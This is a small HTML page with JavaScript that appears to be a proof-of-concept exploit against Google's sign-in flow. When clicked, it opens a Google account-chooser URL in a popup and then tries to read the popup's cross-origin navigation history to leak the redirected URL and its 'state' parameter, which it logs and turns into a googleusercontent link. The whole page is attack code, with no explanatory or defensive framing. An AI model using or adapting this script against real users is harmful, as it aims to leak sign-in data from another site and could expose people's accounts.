<!DOCTYPE html>
<html>
  <head> </head>
  <body>
    <div id="start"></div>

    <script>
      function run() {
        var win = open(
          `https://accounts.google.com/AccountChooser/signinchooser?continue=https://lh3.google.com/u/0/d/1-TTCS6fS6kvFUkoJmX4Udr-czQ79lSUVXiWsiAED_bs=w200-h150-p-k-nu&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0`
        );

        setTimeout(() => {
          try {
            // Coba ambil URL terakhir dari window navigation
            const leak = new URL(win.navigation.entries()[0].url);
            console.log("Leaked URL:", leak.href);

            const redirectURL = `https://lh3.googleusercontent.com/fife/${leak.searchParams.get("state")}`;
            document.body.innerHTML += `<p>Redirected to: <a href="${redirectURL}">${redirectURL}</a></p>`;
          } catch (e) {
            console.error("Error:", e);
            document.body.innerHTML += `<p>Error: ${e.message}</p>`;
          }
        }, 3000);
      }

      document.getElementById("start").innerHTML = `
        <button onclick="run()">Login & Redirect</button>
      `;
    </script>
  </body>
</html>
